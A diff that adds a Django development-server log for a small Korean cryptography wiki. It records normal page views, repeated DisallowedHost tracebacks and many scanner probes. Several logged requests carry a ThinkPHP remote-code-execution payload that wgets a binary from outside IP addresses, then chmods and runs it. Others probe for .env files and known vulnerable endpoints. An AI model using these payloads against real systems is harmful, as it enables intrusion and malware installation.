@@ -1,0 +1,522 @@
+03/Jun/2023 21:03:40] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+[05/Jun/2023 08:01:25] "  à         " 400 -
+Not Found: /actuator/health
+[03/Jun/2023 22:08:19] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://135.148.104.21/w.sh -O w ; chmod 777 w ; ./w ; rm -rf w' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://135.148.104.21/w.sh -O w ; chmod 777 w ; ./w ; rm -rf w' HTTP/1.1" 400 -
+[03/Jun/2023 22:27:56] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://192.210.162.147/x86 -O /tmp/.matrix; chmod 777 /tmp/.matrix; /tmp/.matrix thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://192.210.162.147/x86 -O /tmp/.matrix; chmod 777 /tmp/.matrix; /tmp/.matrix thinkphp' HTTP/1.1" 400 -
+[03/Jun/2023 23:45:42] "GET / HTTP/1.0" 200 2210
+[03/Jun/2023 23:59:57] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[04/Jun/2023 00:12:13] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Invalid HTTP_HOST header: '201.13.121.112'. You may need to add '201.13.121.112' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '201.13.121.112'. You may need to add '201.13.121.112' to ALLOWED_HOSTS.
+[04/Jun/2023 00:51:52] "GET / HTTP/1.1" 200 2210
+[05/Jun/2023 08:01:25,747] - Broken pipe from ('174.49.114.155', 60117)
+Not Found: /favicon.ico
+Not Found: /robots.txt
+[04/Jun/2023 01:14:32] "GET / HTTP/1.1" 200 2210
+Not Found: /api/.env
+[04/Jun/2023 01:34:20] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[04/Jun/2023 01:39:39] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /boaform/admin/formLogin
+Not Found: /.env
+[04/Jun/2023 01:45:02] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 02:00:04] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Not Found: /backend/.env
+[05/Jun/2023 08:01:25] "GET /backend/.env HTTP/1.1" 404 3133
+[04/Jun/2023 02:55:54] "GET / HTTP/1.1" 200 2210
+Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+[04/Jun/2023 03:23:44] "GET / HTTP/1.1" 200 2210
+Not Found: /favicon.ico
+[04/Jun/2023 03:35:56] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /favicon.ico
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Not Found: /favicon.ico
+[05/Jun/2023 08:01:25,847] - Broken pipe from ('113.4.178.133', 58005)
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[04/Jun/2023 04:52:07] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Invalid HTTP_HOST header: 'ipinfo.io:443'. You may need to add 'ipinfo.io' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'ipinfo.io:443'. You may need to add 'ipinfo.io' to ALLOWED_HOSTS.
+[04/Jun/2023 05:24:30] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:25] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[04/Jun/2023 05:47:57] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 05:47:57] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 06:29:08] "GET / HTTP/1.1" 200 2210
+Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+Not Found: /solr/admin/info/system
+[04/Jun/2023 06:33:04] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 06:39:28] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 07:27:06] "GET / HTTP/1.1" 200 2210
+Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+[04/Jun/2023 07:48:14] "GET / HTTP/1.1" 200 2210
+Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+[04/Jun/2023 07:53:24] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Not Found: /index.php
+[04/Jun/2023 09:08:03] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 09:09:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03¦eulÉP\x8bêó\x0eóôg\xad\x9d©7Ì¸±´5\x7fñ\x02¿ÎÏY½\x1aÃ')
+Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+[04/Jun/2023 09:13:20] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /laravel/.env
+[04/Jun/2023 09:14:14] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 09:14:16] "GET /wiki/01%EC%95%94%ED%98%B8%ED%95%99%EC%9D%B4%EB%9E%80 HTTP/1.1" 200 5138
+[04/Jun/2023 09:14:44] "GET /wiki/04%EB%8B%A4%EC%A4%91%20%EC%B9%98%ED%99%98%20%EC%95%94%ED%98%B8%202 HTTP/1.1" 200 8795
+Not Found: /console/
+Not Found: /app/.env
+[04/Jun/2023 09:33:01] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://IPHERE/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /Autodiscover/Autodiscover.xml
+Not Found: /druid/index.html
+[04/Jun/2023 09:57:59] "GET / HTTP/1.1" 200 2210
+Not Found: /_ignition/execute-solution
+[04/Jun/2023 10:08:27] code 400, message Bad request syntax ('test')
+Not Found: /human.aspx
+[04/Jun/2023 10:08:35] code 400, message Bad request syntax ('VERSION')
+[04/Jun/2023 10:08:41] code 400, message Bad HTTP/0.9 request type ('GIOP\x01\x02\x00\x03\x00\x00\x00\x17\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00')
+Not Found: /human2.aspx
+[05/Jun/2023 08:01:26] "GIOP              NameService" 400 -
+Not Found: /Eetie0ph.aspx
+Not Found: /favicon.ico
+[04/Jun/2023 10:19:25] "GET / HTTP/1.1" 200 2210
+Not Found: /geoserver/web/
+Not Found: /cgi-bin/../../../../bin/sh
+[04/Jun/2023 10:34:26] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://192.210.162.147/x86 -O /tmp/.matrix; chmod 777 /tmp/.matrix; /tmp/.matrix thinkphp' HTTP/1.1")
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://192.210.162.147/x86 -O /tmp/.matrix; chmod 777 /tmp/.matrix; /tmp/.matrix thinkphp' HTTP/1.1" 400 -
+Not Found: /human.aspx
+Not Found: /human2.aspx
+[04/Jun/2023 10:35:38] "GET /wiki/07%20%EB%8C%80%EC%B9%AD%ED%82%A4%20%EC%95%94%ED%98%B8 HTTP/1.1" 200 4196
+Not Found: /Eetie0ph.aspx
+[04/Jun/2023 10:35:54] "GET /wiki/06%20One-Time%20Pad HTTP/1.1" 200 5407
+Not Found: /human.aspx
+[04/Jun/2023 10:52:28] "GET /wiki/01%EC%95%94%ED%98%B8%ED%95%99%EC%9D%B4%EB%9E%80 HTTP/1.1" 200 5138
+[04/Jun/2023 10:52:39] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+Not Found: /human2.aspx
+[04/Jun/2023 10:52:50] "GET / HTTP/1.1" 200 2210
+Not Found: /Eetie0ph.aspx
+[04/Jun/2023 10:54:11] "GET /wiki/01%EC%95%94%ED%98%B8%ED%95%99%EC%9D%B4%EB%9E%80 HTTP/1.1" 200 5138
+Not Found: /actuator/gateway/routes
+[04/Jun/2023 10:54:52] "GET /wiki/03%EB%8B%A8%EC%9D%BC%20%EC%B9%98%ED%99%98%20%EC%95%94%ED%98%B81 HTTP/1.1" 200 15781
+Not Found: /geoserver
+[04/Jun/2023 10:54:56] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'google.com:443'. You may need to add 'google.com' to ALLOWED_HOSTS.
+[04/Jun/2023 10:55:10] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+[04/Jun/2023 10:55:24] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+Not Found: /.env
+[04/Jun/2023 10:55:28] "GET /wiki/02%EC%95%94%ED%98%B8%ED%95%99%EC%9D%98%20%EC%97%AD%EC%82%AC HTTP/1.1" 200 3306
+Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\core\handlers\exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\utils\deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\middleware\common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "C:\Users\aaaa\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\LocalCache\local-packages\Python311\site-packages\django\http\request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'DESKTOP-FN33P05'. You may need to add 'desktop-fn33p05' to ALLOWED_HOSTS.
+[04/Jun/2023 10:55:31,855] - Broken pipe from ('211.105.48.119', 50719)
+Not Found: /favicon.ico
+[04/Jun/2023 10:57:10] "GET /wiki/03%EB%8B%A8%EC%9D%BC%20%EC%B9%98%ED%99%98%20%EC%95%94%ED%98%B81 HTTP/1.1" 200 15781
+[04/Jun/2023 11:01:03] "GET /wiki/04%EB%8B%A4%EC%A4%91%20%EC%B9%98%ED%99%98%20%EC%95%94%ED%98%B8%202 HTTP/1.1" 200 8795
+[04/Jun/2023 11:02:17] "GET /wiki/05%EC%A0%84%EC%B9%98%EC%95%94%ED%98%B8%20(Transposition%20Cipher) HTTP/1.1" 200 12208
+Bad Request: /google.com:443
+[04/Jun/2023 11:03:45] "GET /wiki/07%20%EB%8C%80%EC%B9%AD%ED%82%A4%20%EC%95%94%ED%98%B8 HTTP/1.1" 200 4196
+[04/Jun/2023 11:04:07] "GET /wiki/06%20One-Time%20Pad HTTP/1.1" 200 5407
+Bad Request: /boaform/admin/formLogin
+[04/Jun/2023 11:07:35] "GET /wiki/04%EB%8B%A4%EC%A4%91%20%EC%B9%98%ED%99%98%20%EC%95%94%ED%98%B8%202 HTTP/1.1" 200 8795
+Bad Request: /http:/5.188.210.227/echo.php
+[04/Jun/2023 11:25:42] code 400, message Bad request version ('À\x14À')
+Not Found: /favicon.ico
+Bad Request: /http:/5.188.210.227/echo.php
+[04/Jun/2023 11:26:53] "GET / HTTP/1.1" 200 2210
+Bad Request: /google.com:443
+Bad Request: /ipinfo.io:443
+[04/Jun/2023 11:40:47] "GET / HTTP/1.1" 200 2210
+[04/Jun/2023 11:42:24] "GET / HTTP/1.1" 200 2210
+Bad Request: /
+[04/Jun/2023 11:51:57] "GET / HTTP/1.1" 200 2210
+Bad Request: /
+Bad Request: /http:/5.188.210.227/echo.php
+[04/Jun/2023 12:06:04] "GET / HTTP/1.1" 200 2210
+Bad Request: /GponForm/diag_Form
+Bad Request: /google.com:443
+[04/Jun/2023 12:39:49] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
+Not Found: /favicon.ico
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+Not Found: /favicon.ico
